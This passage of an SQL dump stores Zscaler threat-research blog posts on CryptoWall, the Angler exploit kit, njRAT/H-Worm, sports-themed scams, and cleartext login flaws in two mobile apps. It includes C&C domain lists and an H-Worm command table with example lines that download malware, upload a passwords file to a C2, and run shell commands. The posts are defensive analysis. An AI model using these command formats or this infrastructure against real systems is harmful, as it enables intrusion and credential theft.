Control (C&C) servers:\r\n\r\n\r\n	alkhatip[.]com\r\n	aseanian[.]com\r\n	bijouxbjx[.]com\r\n	buildtrue[.]com\r\n	corporatemonks[.]com\r\n	eturedesigns[.]com\r\n	futong8[.]com\r\n	geiliyou[.]com\r\n	houseofstarz[.]com\r\n	hscompany[.]net\r\n	ineshworld[.]com\r\n	iuliasalaria[.]org\r\n	judora-ng[.]com\r\n	leutezentrum[.]com\r\n	miguelations[.]com\r\n	ocarma[.]org\r\n	ocvitcamap[.]com\r\n	ouarzazateonline[.]com\r\n	ruanlianjie[.]net\r\n	sapacmold[.]com\r\n	spark-leds[.]com\r\n	trillyo[.]com\r\n	ubikate[.]mx\r\n	weapex[.]com\r\n	www[.]ebouw[.]nl\r\n	www[.]getserved[.]nl\r\n	www[.]multiposting[.]nl\r\n	www[.]ubikate[.]mx\r\n\r\nThe following URI format is observed across all POST transactions:\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			/img[/d].php?[a-z]=[string]\r\n		\r\n	\r\n\r\nThese beaconing activities take place for the duration of the compromise to C&C servers seen around the world.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Unique C&C locations\r\n		\r\n	\r\n\r\n\r\nOnce infected, CryptoWall 3.0 puts the victim on an extortion countdown. The ransom amount doubles at each threshold set by the attacker. The attacker\'s preferred currency is in Bitcoin, but the victim is offered numerous methods of payment.\r\n \r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			TOR site for Ransom payment\r\n		\r\n	\r\n\r\n\r\n\r\n \r\n\r\nRansomware continues to be a highly profitable attack vector. This particular campaign spreads through numerous methods, but the resulting payload is consistent whether the victim is attacked through spam, a compromised website or via an exploit kit. While security vendors try their best to ensure coverage against this malware family, the most effective defense for the end user is to adopt a preventative approach of taking regular backups of sensitive files.', 'Ransomware', 'https://www.zscaler.com/blogs/research/cryptowall-30-campaign-still-kicking');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (150, 'Angler Exploit Kit Utilizing 302 Cushioning And Domain Shadowing', 'ThreatLabz', 'April 03, 2015', 'Overview  Angler Exploit Kit is one of the most prevalent and advanced exploit kits in use today and is continually evolving. Angler continues to utilize malvertising to push landing pages and malicious actors are still registering domains solely for serving exploits, but recently, we\'ve noticed an increase in two new infection vectors - 302 Cushioning and Domain Shadowing.    302 Cushioning, or a \'cushion attack\', is used to redirect victims to malicious sites without the use of more traditional techniques, such as hidden iframes or external \'script src\' tags. The attackers are using HTTP 302 redirects over iframes here to evade detection by traditional signature-based IDS/IPS engines. This technique is not new and was discussed back in 2013. Domain shadowing, a term coined by Cisco, involves compromising the parent domain and creating multiple sub-domains that point to malicious code. This means that in the majority of cases, a victim\'s hosting account credentials are compromised. These sub-domains can be created and deleted quickly, making this an attractive technique for bypassing domain and URL blocklists.    These developments are notable since they show an evolving approach to exploit delivery. Angler has long used obfuscation and encryption on landing pages and payloads Combined with cushioning and domain shadowing, Angler adds yet another layer of stealth for defenders to counter.     Exploit Cycles  The exploit cycle typically starts with compromised websites followed by a 302 Cushioning attack & Domain Shadowing leading to an Exploit Kit hosting site as seen below:      	  		  			  		  		  			Fig 1: Exploit cycle seen during these attacks  		  	    Direct exploitation, as shown below, happens immediately when accessing the compromised site.            	  		  			  		  		  			Fig 2: Wireshark showing direct path to exploit  		  	    The full cycle from victim site to successful exploitation is shown in the annotated Fiddler screenshot below.       	  		  			  		  		  			Fig 3: Full sample exploit cycle  		  	    Session 2 (above) corresponds to the initial 302 cushion upon accessing the victim site (detailed in Fig 2). Session 3 contains a small block of code (Fig 4 below) to initiate session 4. Session 4 302\'s to the actual Angler landing page in session 5.       	  		  			  		  		  			Fig 4: Initiate session 4 via top.location.replace  		  	    Note that the sub-domain changes between sessions 4 and 5:       	  		  			  		  		  			Fig 5: Sub-domain change for landing page  		  	    Indirect exploitation is similar to the direct exploitation method described above, but occurs after a domain is accessed that utilizes remotely hosted content. Once the content is accessed, there is a similar 302 cushion to the exploit domain.       	  		  			  		  		  			Fig 6: 302 cushion from intermediary domain  		  	           	  		  			  		  		  			Fig 7: Domain graph showing indirect exploitation  		  	      Landing Page Analysis  The landing page for Angler is typical, with a substantial amount of randomized code and whitespace, but scrolling to the bottom reveals that there are multiple strings delimited with \'3~4\' and the split function is declared toward the top of the page.       	  		  			  		  		  			Fig 8: Split function for 3~4  		  	           	  		  			  		  		  			Fig 9: Delimited string simply uses fromCharCode  		  	    This is followed by an \'eval\' of the variable \'kzfzSU\' which contains the deobfuscated code:       	  		  			  		  		  			Fig 10: eval(deobfuscated code)  		  	    Taking a look at the deobfuscated code, there are several structures that are consistent with well-known exploits being served, including functions for \'flash_run\' and \'GetSLV\':       	  		  			  		  		  			Fig 11: IE11 - CVE-2014-4130   		  	        	  		  			  		  		  			Fig 12: flash_run - Flash CVE-2015-0336  		  	           	  		  			  		  		  			Fig 13: GetSLV - Silverlight CVE-2013-0074  		  	           	  		  			  		  		  			Fig 14: IE 10 - CVE-2013-2551  		  	    The majority of this is standard and has been documented by many researchers. Kafeine has done an excellent job chronicling Angler and other exploit kits and additional information on the landing page exploits can be found on his pastebin.     Exploits & Payload  The exploit we examined was Flash exploit CVE-2015-0336. One interesting point is that the SWF file was LZMA compressed, which appears to be an attempt to evade detection.       	  		  			  		  		  			Fig 15: LZMA compressed SWF exploit payload  		  	    The SWF takes a parameter, which is an encrypted URL pointing to the location of the binary payload that is executed upon successful exploitation. The binary payload is also encrypted:       	  		  			  		  		  			Fig 16: Encrypted malware payload  		  	      VirusTotal detection on the SWF was very poor with only 1/56 vendors alerting at time of upload.       	  		  			  		  		  			   		  	      The malware payload dropped at the end of a successful exploit cycle belongs to the Carberp Banking Trojan family. The Carberp Trojan family is known for stealing online banking credentials as well as user credentials for a variety of applications. It is also capable of downloading additional malware on the victim machine. It\'s important to note that the payload is downloaded in an encrypted form and decrypted in memory on the victim machine before being executed by the SWF exploit payload.    The malware binary has better detection coverage with 31/57 AV engines presently providing detection.         Conclusion  A 302 Cushioning attack combined with a Domain Shadowing technique is clearly aimed to exploit the current enterprise security posture which still relies heavily on URL categorization and Domain based blocking. With the growing threat landscape, enterprises have started to adopt multiple security solutions to guard their perimeter; however, it is still common for these enterprises to leverage URL categorization to further decide on which traffic goes through some of the more advanced layers of security inspection. Domain Shadowing techniques will cause these attacks to slip through such security policies.    It will not be surprising to see an increase in the usage of these techniques by the cyber-criminals in future attack campaigns. We at ThreatLabZ are closely monitoring this attack vector and ensuring protection for the Zscaler customers.    Thank you to Peleus Uhley from Adobe\'s PSIRT for quick response in confirming the SWF exploit.     IOC List  We\'ve created a couple pastes with a subset of the primary and full domains we\'ve observed.    Full domains (including subdomain)  Primary domains only    Note that many of these domains are detectable with simple regex searches. Also note that the URI includes base64-encoded data about the referrer, among other datapoints. Decoded examples:    	myfineiu=qsphhyzxgn&time=15032408472520608466&src=63&surl=js.sonoo.info&sport=80&key=700EE759&suri=/  	vocvokxj=gwttjva&time=15032408474283214620&src=76&surl=myfilestore.com&sport=80&key=A6D9DE16&suri=/download.php%3fid=c01aa495  	js=1&ankheji=pj&time=15032408324140253339&src=205&surl=www.fiercebook.com&sport=80&key=E3907BB8&suri=/js/msdropdown/jquery.dd.min.js  	gshspa=lnrsclzpan&time=15032408322451558688&src=77&surl=www.einkaufscenter-in-deutschland.de&sport=80&key=9A9DC80&suri=/index.php  	sxlzlq=dwhi&time=1503240817829836824&src=33&surl=www.thailandsusu.com&sport=80&key=521A223A&suri=/webboard/index.php%3faction=dlattach%3battach=175685%3btype=avatar  	neygvev=ii&time=15032407471753639860&src=76&surl=url4short.info&sport=80&key=50B3117&suri=/1503e6bd  	yrwzim=hzflgicmos&time=15032407022641179106&src=76&surl=myfilestore.com&sport=80&key=ADE2C3CF&suri=/download.php%3fid=728768e6  	yrwzim=hzflgicmos&time=15032407022641179106&src=76&surl=myfilestore.com&sport=80&key=70625872&suri=/download.php%3fid=728768e6  	wxzyhrcf=gmejggpbvw&time=15032406171268943104&src=76&surl=filestore72.info&sport=80&key=7377ADCF&suri=/download.php%3fid=79ad4669  	gptpil=yjostm&time=15032406023680222021&src=76&surl=filestore72.info&sport=80&key=A52D850E&suri=/download.php%3fid=faa55a6b  	js=1&gumsczeo=gpgqfxln&time=15032406022626420737&src=128&surl=www.pho-thong.com&sport=81&key=949218C1&suri=/include/jquery.js  	sulylnp=ceilsubfx&time=15032405321533647318&src=136&surl=kodseries.com&sport=80&key=6425E43B&suri=/title-00215      Links to VT sample pages:  289ac177212625026b679c4b73849e00 - SWF  340e19aea447bee696453b9c4bd9f65c - Carberp', 'Evasion/Stealth;Exploit Kit;Vulnerability', 'https://www.zscaler.com/blogs/research/angler-exploit-kit-utilizing-302-cushioning-and-domain-shadowing');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (151, 'Mobile App Wall Of Shame: Wattpad', 'Viral Gandhi', 'April 02, 2015', 'Wattpad    Price : Free  Category : Books & Reference  Platform : Android  Updated : Mar. 23, 2015  Version : 4.21  Size : 11.18 MB  Language : English  Vendor : Wattpad.com    Background:    Wattpad is the world\'s largest community for readers and writers and was established since 2006. Users are able to post articles, stories, fan fiction and poems about anything they like. The content includes work by undiscovered writers, published writers, new writers, or people just looking for somewhere to write all their ideas down. Users are able to comment and like stories or join different groups. Wattpad has released dedicated applications for Android, iPhone, Blackberry and iPad.       Application chart (Courtesy: Appannie, xyo.net)          	  		  			  			   			  			  			     			Android  			  		  		  			  			Global Ranking  			  			  			170  			  		  		  			  			Category Ranking  			  			  			5 (Books & Reference)  			  		  		  			  			Total number of Downloads  			  			  			~42 million  			  		  		  			  			Rating  			  			  			4.5/5  			  		  	          Before using the app, a user is required to create an account in Wattpad by providing an email address and password. After creating an account they can post stories, read other user\'s posts, follow users and like or comment on existing content. The application also provides feature to sync Gmail, Facebook and Twitter accounts with a Wattpad account. There is also a provision to send private messages to other users from within Wattpad.         Vulnerability: cleartext username/password             	  		  			  		  		  			Wattpad app  		  	    The current version of Wattpad for Android application has a major security issue. By analyzing the traffic during the user registration as well as the account login process, it has been observed that user credentials are being sent to the server via HTTP. Anyone who monitors the network traffic can easily get a hold of the username/password being sent to the application server and compromise the user\'s account. As the application permits users to buy books, an attack could also result in financial loss.    When a user tries to register for an account using the Wattpad Android application, or subsequently login, clear text user credentials as sent via an HTTP request as shown below.                      Account registration:           [-]http://www.wattpad.com/v4/users     Method: POST    Host: www.wattpad.com    User-Agent: Android App v4.19.17; Model: Nexus 7; Android SDK: 21; Connection: WiFi; Locale: en_US;    Request Body: type=wattpad&username=fnzscaler&password=p%40ssword123&email=vulapps%40zscaler.com&language=1&fields=token%2Cga%2Cuser%28username%2Cdescription%2Cavatar%2Cname%2Cemail%2Cverified%2Cfollower%2Cfollowing%2CbackgroundUrl%2CvotesReceived%2CnumFollowing%2CnumFollowers%2Clanguage%2Cinbox%28unread%29%2Chas_password%29    Server Response: {\"token\":\"52708887:2129beadf9030d8725750694ec5ee4a1928dbed9891db7bfa0bc432713037a7b\",\"user\":{\"username\":\"fnzscaler\",\"name\":\"\",\"description\":\"\",\"avatar\":\"http:\\/\\/a.wattpad.com\\/useravatar\\/b.128.jpg\",\"language\":1,\"verified\":false,\"votesReceived\":0,\"numFollowing\":0,\"numFollowers\":0,\"backgroundUrl\":\"\",\"inbox\":{\"unread\":0},\"email\":\"vulapps@zscaler.com\",\"has_password\":true,\"follower\":false,\"following\":false},\"ga\":{\"logged\":\"1\",\"created\":\"20150316\",\"group\":0}}             Likewise, when an existing user tries to login, the username/password will be sent in cleartext.    Below is the traffic capture for a login session.           Login:         [-]http://www.wattpad.com/v4/sessions     Method: POST    Host: www.wattpad.com    User-Agent: Android App v4.19.17; Model: Nexus 7; Android SDK: 21; Connection: WiFi; Locale: en_US;    Request Body: type=wattpad&username=fnzscaler&password=p%40ssword123&fields=token%2Cga%2Cuser%28username%2Cdescription%2Cavatar%2Cname%2Cemail%2Cverified%2Cfollower%2Cfollowing%2CbackgroundUrl%2CvotesReceived%2CnumFollowing%2CnumFollowers%2Clanguage%2Cinbox%28unread%29%2Chas_password%29    Server Response: {\"token\":\"52708887:2129beadf9030d8725750694ec5ee4a1928dbed9891db7bfa0bc432713037a7b\",\"user\":{\"username\":\"fnzscaler\",\"name\":\"\",\"description\":\"\",\"avatar\":\"http:\\/\\/a.wattpad.com\\/useravatar\\/b.128.jpg\",\"language\":1,\"verified\":false,\"votesReceived\":0,\"numFollowing\":0,\"numFollowers\":0,\"backgroundUrl\":\"\",\"inbox\":{\"unread\":0},\"email\":\"vulapps@zscaler.com\",\"has_password\":true,\"follower\":false,\"following\":false},\"ga\":{\"logged\":\"1\",\"created\":\"20150316\",\"group\":0}}           ZAP Analysis:      	  		  			  		  		  			Zap in action.  		  	              Conclusion:         The rapidly growing list of applications that do not implement even the most basic security checks makes it necessary for users to take care when accessing their accounts on public networks. It is also important important to avoid password reuse in multiple applications.    Credit - Lakshmi Devi.', 'Encryption;Mobile;Mobile Malware', 'https://www.zscaler.com/blogs/research/mobile-app-wall-shame-wattpad');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (152, 'March Madness Ads, Scams, And Malware', 'Ed Miles', 'March 20, 2015', 'Introduction      March Madness is officially upon us, with the last games of the round of 64 taking place today. As is usual with events that have such a level of interest, bad actors across the internet will be trying to get their cut of the action through topical spam advertising and phishing as well as search engine poisoning to draw ad revenue and in some cases, deliver malicious software. Though it is still early in the cycle of March Madness interest, we have seen a bit of everything: malware purporting to be NCAA bracket templates, a rash of ad-filled sites running March Madness related SEO campaigns, and the usual complement of shady streaming sites promising live streams of the tournament games (with some delivering a nasty surprise).         	  		  			  		  		  			NCAA Tournament related traffic shows a sharp uptick as the games began.  		  	           	  	        NCAA Bracket Download Leads to Malware           While reviewing some of the tournament-related security blocks, we spotted an interesting file download attempt. It\'s not clear if the original click was derived from a search, but the primary link purports to be a zipped PDF file that can be used to create personalized brackets. The link ultimately directs to an unwanted EXE signed by the Ukranian publisher BERSHNET LLC (whose history is well documented on HerdProtect).                	  		  			  		  		  			The downloaded file features a valid Authenticode Certificate.  		  	           The binary features an unusual number of protections against analysis for what appears to be simple adware. At this time, we have not fully explored the capabilities of the binary, but analysis shows that the sample gathers system information and sends it to a CloudFlare-hosted command & control server.         	  		  			  		  		  			HTTP Check-in activity includes POSTing system information.  		  	             	  	        Fake .tk Blogs Generate Ad Revenue and Expose Users      Numerous ad-filled and auto-generated blogs have been popping up to take advantage of unwary search-engine users looking for bracket templates and related web-searches. While we have not seen any overtly malicious behavior on these sites, they represent a potential threat against the unwary searcher.                 	  		  			  		  		  			   		  	        	  		  			  		  		  			Auto-generated blogs taking advantage of popular search terms.  		  	            An interesting trend among these sites is the use of the free country TLD .tk. This isn\'t too surprising since the use of free domains is similar to the use of a dynamic DNS service, but the .tk TLD is slightly less conspicuous compared to no-ip.com or other common alternatives.       Streaming Scams Deliver Malware    Similar to sites offering bracket templates and insights on the match-ups, a large number of sites promising the ability to stream NCAA games have popped up to capture search traffic and generate ad-revenue. Unlike the SEO blogs, we have spotted -- and blocked -- malicious downloads related to tournament streams.         	  	        	  		  			  		  		  			Numerous scam sites are found among the top Google hits.  		  	        	  		  			  		  		  			Fake streaming site is filled with ads and fake plug-in install prompts.  		  	        	  		  			   		  	          	  		  			  		  		  			Download page for fake plug-in emulates Adobe look and feel.  		  	             	  	           Although this binary does not initially appear as sophisticated as the fake-bracket sample above, it downloads two supplemental encrypted files, one large binary blob and one base-64 encoded text file. Further analysis is needed to enumerate all functionality, but the malware can be observed collecting system information and sending it to a remote server.           	  		  			  		  		  			Post-infection activity downloads another binary and POSTs system information.  		  	             	  	             	  	      It should be noted that the NCAA has put tight restrictions on the streaming of the tournament, and apart from the first round, streaming the games requires a pay-TV subscription.       Conclusion           All of these examples should highlight the diversity of threats that latch on to the popularity of March Madness. We would like to advise the readers to exercise caution when doing searches or clicking on links related to March Madness.    Zscaler ThreatLabZ has deployed multiple layers of protection against these scams, safeguarding the users even when they are tricked into clicking a nefarious link.', 'Advertising;Click Fraud;Malware', 'https://www.zscaler.com/blogs/research/march-madness-ads-scams-and-malware');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (153, 'NjRAT & H-Worm Variant Infections Continue To Rise', 'Deepen Desai', 'March 20, 2015', 'Introduction\r\n\r\n \r\nnjRAT Trojan also known as Bladabindi, is a Remote Access Tool (RAT) that was first seen in 2013 and has been extremely prevalent in the Middle Eastern region. njRAT was developed using Microsoft\'s .NET framework and like many other RATs, provides complete control of the infected system and delivers an array of features to the remote attacker. We have seen attackers leveraging popular gaming & software application cracks & keygens as the lure to infect end users.\r\n\r\n \r\n\r\nThere have been many variants of njRAT. H-Worm, also known as Houdini, is one of the most popular variants and was reportedly used in attacks against the international energy sector. In this blog we will provide a brief overview of njRAT and H-Worm as well as an analysis of the H-Worm activity we\'ve seen over the past few months.\r\n\r\n \r\n\r\nnjRAT\r\n\r\n\r\n\r\n \r\n\r\nThe njRAT Trojan remains one of the most successful RATs in the wild because of the wide spread online support and tutorials available for cyber criminals. There are a variety of .NET obfuscation tools that make detection difficult for antivirus solutions and hinders analysis by security researchers. njRAT utilizes dynamic DNS for command and control (C2) servers and communicates using a custom TCP protocol over a configurable port.\r\n\r\n \r\n\r\nThe C&C callback from the infected system includes following information:\r\n\r\n\r\n	Bot identifier (based off configurable string in builder & volume serial number)\r\n	Computer name (Base 64 encoded)\r\n	Operating system information\r\n	Existence of attached webcam (Yes/No)\r\n	Bot version\r\n	Country code\r\n	Title of the active process window\r\n\r\n\r\nBelow is a sample C&C message:\r\n\r\n \r\n\r\n253 ll|\'|\'|TW9pXzUwRkFBNTQw|\'|\'|247525|\'|\'|Win7 64Bit|\'|\'|79-11-30|\'|\'||\'|\'|Win7 Enterprise SP1 x64|\'|\'|No|\'|\'|0.7d|\'|\'|..|\'|\'|QWRtaW5pc3RyYXRvcjogQzpcV2luZG93c1xzeXN0ZW0zMlxjbWQuZXhlIC0gYzpcUHl0aG9uMjdccHl0aG9uLmV4ZSAgc2ltcGxlX3NvY2tldF9zZXJ2ZXIucHkA|\'|\'|\r\n\r\nDecoded Base64 string #1 (botID_volume-serial-number): Moi_50FAA540\r\nDecoded Base64 string #2 (currently focused window): Administrator: C:\\Windows\\system32\\cmd.exe - \r\n \r\n\r\nnjRAT allows the remote attacker to perform following activities on the infected system:\r\n\r\n\r\n\r\n	File system changes\r\n	Log keystrokes\r\n	Download and execute a remote file\r\n	Remote desktop\r\n	Webcam access\r\n	Microphone access\r\n	Obtain user credentials for multiple applications\r\n	Reverse command shell\r\n\r\n\r\n\r\nThe latest instances of njRAT infections we have seen are for version 0.7d. Below are some screenshots of the njRAT\'s control panel accessible to the attacker:\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			njRAT C&C control panel\r\n		\r\n	\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			njRAT builder panel\r\n		\r\n	\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			njRAT author information\r\n		\r\n	\r\n\r\n \r\n\r\nH-Worm\r\n\r\n \r\n\r\nH-Worm is a VBS (Visual Basic Script) based RAT which we believe is derived off the njRAT source code. H-Worm provides cyber-criminals similar controls to njRAT. It also uses dynamic DNS for its C&C servers but unlike njRAT it uses POST requests and the HTTP User-Agent field to exfiltrate sensitive information from the infected machine.\r\n\r\nThe C&C communication POST requests typically uses parameters \'cmd\' and \'param\' as seen in the table below:\r\n\r\n \r\n\r\n\r\n	H-Worm Bot Command Summary\r\n	\r\n		\r\n			Bot Command\r\n			Description\r\n			Example\r\n			Connection URI\r\n		\r\n		\r\n			execute\r\n			Execute vb code sent in response\r\n			execute<|>vbscript code\r\n			None\r\n		\r\n		\r\n			update\r\n			Update bot code to provided code (overwrites existing file)\r\n			update<|>new vbscript bot code\r\n			None\r\n		\r\n		\r\n			uninstall\r\n			Removes the bot from the victim machine\r\n			uninstall\r\n			None\r\n		\r\n		\r\n			send\r\n			Downloads content from a URL and dumps at a directory\r\n			send<|>http://www.example.com/malware.exe<|>c:\\\r\n			None\r\n		\r\n		\r\n			site-send\r\n			Downloads content from a URL and saves with specified nam\r\n			site-send<|>http://www.example.com/script.vbs<|>c:\\script.vbs\r\n			None\r\n		\r\n		\r\n			recv\r\n			Uploads a file to the C2 domain\r\n			recv<|>C:\\Users\\User\\Documents\\passwords.txt\r\n			POST /is-recving\r\n		\r\n		\r\n			enum-driver\r\n			Sends information on the victim\'s system drives\r\n			enum-driver\r\n			POST /is-enum-driver\r\n		\r\n		\r\n			enum-faf\r\n			Sends a directory listing for a given path\r\n			enum-faf<|>C:\\Users\\User\\\r\n			POST /is-enum-path\r\n		\r\n		\r\n			enum-process\r\n			Sends the process listing of the victim\'s system\r\n			enum-process\r\n			POST /is-enum-process\r\n		\r\n		\r\n			cmd-shell\r\n			Run a command via \'%comspec% /c\' on the infected host\r\n			cmd-shell<|>calc.exe\r\n			POST /is-cmd-shell\r\n		\r\n		\r\n			delete\r\n			Deletes a specified file or folder from the victim\'s system\r\n			delete<|>C:\\Users\\User\\Documents\\\r\n			None\r\n		\r\n		\r\n			exit-process\r\n			Kills the specified process ID via taskkill\r\n			exit-process<|>123\r\n			None\r\n		\r\n		\r\n			sleep\r\n			Sets the number of milliseconds to sleep between \'ready\' beacons (default 5000)\r\n			sleep<|>10000\r\n			None\r\n		\r\n	\r\n\r\n\r\n \r\n\r\nThe C&C callback from an infected system includes following information in the User-Agent field:\r\n\r\n\r\n	Bot identifier (based off configurable string in builder & volume serial number)\r\n	Computer name\r\n	Username\r\n	Operating system information\r\n	Bot version\r\n	Antivirus information (Default value \'nan-av\')\r\n	USB spreading [true/false] with date obtained from bot\'s registry entry.\r\n\r\n\r\nBelow are some screenshots of H-Worm\'s control panel accessible to the attacker, from two different variants:\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			H-Worm plus version C&C control panel\r\n		\r\n	\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			H-Worm control center [similar to njRAT\'s Manager]\r\n		\r\n	\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			H-Worm plus version builder panel\r\n		\r\n	\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			H-Worm extended/lite version C&C control panel\r\n		\r\n	\r\n\r\n\r\n \r\n\r\nWe continue to see many new variants of H-Worm popping up in the wild. Below are the version strings from some of the active H-Worm variants we have been tracking in 2015:\r\n\r\n	2.0\r\n	3az version\r\n	hello\r\n	KKMM NICE PC\r\n	mod version\r\n	plus\r\n	POUSSIN\r\n	safa7_22\r\n	SKY ESP PC\r\n	spupdate\r\n	the KR.joker worm\r\n	underworld final\r\n	v1.8.3  By AB DELL\r\n	v1.8.7  By AB DELL\r\n	worm Of Dz-47\r\n	WORM OF DZ-47\r\n\r\nBelow is the Geo distribution of the active Command & Control servers we have oberved thus far in 2015:\r\n \r\n\r\n\r\nOne of the most popular features of this RAT family is the usage of Dynamic DNS for its Command & Control server communication. We have seen multiple sub-domains from the following Dynamic DNS domains in 2015 being abused by the malware authors for C&C communication:\r\n\r\n	adultdns.net\r\n	cable-modem.org\r\n	dz47.cf\r\n	ddns.net\r\n	dnsd.info\r\n	dvr-ddns.com\r\n	dyndns.org\r\n	dynu.net\r\n	ftp21.net\r\n	mooo.com\r\n	myq-see.com\r\n	no-ip.biz\r\n	noip.me\r\n	no-ip.org\r\n	redirectme.net\r\n	sells-it.net\r\n	servecounterstrike.com\r\n	serveftp.com\r\n	servehttp.com\r\n	servequake.com\r\n	sytes.net\r\n	user32.com\r\n	zapto.org\r\n\r\nConclusion\r\n\r\nnjRAT & H-Worm variant infections continue to rise, and while this threat is reportedly more prevalent in the Middle-East region, we continue to see infections in other parts of the world as well. Despite Microsoft\'s attempts to disrupt the C&C channel for this notorious RAT back in June 2014, we continue to see the usage of various dynamic DNS services by the malware authors for it\'s C&C server communication. It remains one of the most popular and prevalent RATs in the wild today.\r\n\r\nZscaler ThreatLabZ has deployed multiple layers of protection against this threat to ensure that the customers are protected.\r\n\r\nPast reports on this threat\r\nhttp://www.fidelissecurity.com/sites/default/files/FTA_1009-njRAT_Uncovered_rev2.pdf\r\nhttp://www.fidelissecurity.com/sites/default/files/FTA%201010%20-%20njRAT%20The%20Saga%20Continues.pdf\r\nhttp://phishme.com/the-return-of-njrat/\r\nhttp://blog.trendmicro.com/trendlabs-security-intelligence/new-rats-emerge-from-leaked-njw0rm-source-code/\r\nhttp://www.symantec.com/connect/blogs/simple-njrat-fuels-nascent-middle-east-cybercrime-scene\r\nhttps://blogs.mcafee.com/mcafee-labs/trail-njrat\r\nhttps://www.fireeye.com/blog/threat-research/2013/09/now-you-see-me-h-worm-by-houdini.html\r\n\r\nAnalysis by Deepen Desai & John Mancuso', 'Evasion/Stealth;Malware', 'https://www.zscaler.com/blogs/research/njrat-h-worm-variant-infections-continue-rise');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (154, 'Mobile App Wall Of Shame: Shaadi.com', 'Viral Gandhi', 'March 17, 2015', 'Shaadi.com    Price : Free  Category : Social  Platform : iOS and Android  Updated : Mar. 9, 2015 (Android), Mar. 10 2015 (iOS)  Version : 4.2.2 (Android), 4.2.1 (iOS)  Size : 8.28 MB (Android), 17.7 MB (iOS)  Language : English  Vendor : People Interactive (I) Pvt. Ltd.    Background:     Shaadi.com is the world\'s largest matrimonial website, active since 1995. This matrimonial site permits individuals to post their profiles and responses including horoscope, caste, language and religion. Shaadi.com provides applications designed for the two main mobile platforms – iOS and Android.    Application Chart (information retrieved from Appannie & xyo.net):      	  		  			  			  			  			  			  			  			     			Android  			  			  			     			iOS  			  		  		  			  			Global Ranking  			  			  			15  			  			  			92  			  		  		  			  			Category Ranking  			  			  			12 (Social)  			  			  			24 (Social networking)  			  		  		  			  			Total number of Downloads  			  			  			~1 million  			  			  			 ~0.3 million  			  		  		  			  			Rating  			  			  			3.9/5  			  			  			2.7/5  			  		  	      A new user is required to register by providing an email address and a password, along with basic personal details. After registering the account, the user can surf profiles created by others. The application also provides a chat facility.    Vulnerability - Cleartext username/password         	  		  			  		  		  			Login screen  		  	      The current version of the Shaadi.com application has a serious security flaw. It has been verified that both the iOS and Android versions of the application transmit the username and password via HTTP in cleartext. This flaw allows an attacker to capture the credentials sent by a user to the application server and thus compromise the user\'s account, which may lead to compromise of user\'s personal data. The service also provides premium accounts to paid customers.     The application was tested on both the Android and iOS platforms. The vulnerability has been confirmed on Android (v4.2.2 - latest version, updated on Mar. 9, 2015) and iOS (v4.2.1 - latest version, updated on Mar. 10, 2015).      Vulnerability in iOS version        When a user tries to register for an account on the Shaadi.com application, an HTTP request is generated. In the request the userid, password and mobile number of the user is sent in cleartext as seen below:    Account Registration         [-]http://www.shaadi.com/registration/user/?regmode=app&OS=native-iphone    Method: POST     Host: www.shaadi.com     User-Agent: native-iphone|4.1.0     Request Body: form_referral_url=&form_url=http%3A%2F%2Fwww.shaadi.com%2Fregistration%2Fuser%3Fregmode%3Dapp%26appver%3D4.1.0%26os%3Dnative-iphone%26deviceid%3D---%257C---&form_name=MOB_DR_SEO_REG1&frompage=From+Reg+Page&go=&olmt_home_regpage=&hid_year=&oscode=2&email=fnzscalerlnzscaler%40gmail.com&password1=p%40ssword123&postedby=Self&first_name=fnzscaler&last_name=lnzscaler&gender=Male&day=01&month=01&year=1994&community=No+Religion&mother_tongue=Konkani&countryofresidence=USA&contact_tel_number=Landline+No.         Similarly, when an already existing user tries to login to his account by providing his username and password, these credentials are also being sent in cleartext. Below is the traffic capture when a user tries to login to an existing account:         Login         [-]http://www.shaadi.com/native-apps2/user/login?email=fnzscalerlnzscaler@gmail.com&password=p@ssword123&appver=4.1.0&os=native-iphone&deviceid=---%7C---     Method: GET                Host: www.shaadi.com                User-Agent: Shaadi/462 CFNetwork/711.1.16 Darwin/14.0.0                Server Response: {\"status\":\"200\",\"data\":{\"sid\":\"7B16D793AFF0443EE1320F85EFD1B4C51425446439\",\"abc\":\"0CE03847FB4B0C981EB552E34E1C96B61425446522|ZSH82845405|\",\"premium\":false,\"gender\":\"Male\",\"age\":\"21\",\"memberstatus\":\"ToBeScreened\",\"memberlogin\":\"ZSH82845405\",\"photograph_status\":\"photo_request\",\"update_available\":false,\"has_notification\":\"N\",\"has_chat_notification\":\"N\",\"content_settings\":{\"eoi\":\"Y\",\"acc\":\"Y\",\"msg\":\"Y\",\"nf1\":\"N\",\"dr\":\"Y\"},\"display_name\":\"SH82845405\",\"username\":\"SH82845405\",\"email\":\"fnzscalerlnzscaler@gmail.com\",\"use_connect\":1,\"upgrade_message\":\"UPGRADE TO PREMIUM\",\"support_telephone\":\"1860-200-3456\",\"payment_telephone\":\"1860-200-3456\"},\"expdt\":\"20150403002202\",\"banner_images\":{\"banner_search_results\":{\"title\":\"Become a Premium Member & connect directly via\",\"subtitle\":\"EMAIL, CHAT & PHONE\",\"details\":\"\",\"version\":\"\",\"img\":\"http:\\/\\/img.shaadi.com\\/community\\/images\\/app\\/banner_search_results_male_free_high.png\"},\"banner_accepted\":{\"title\":\"Upgrade to Premium & start chatting with your Accepted 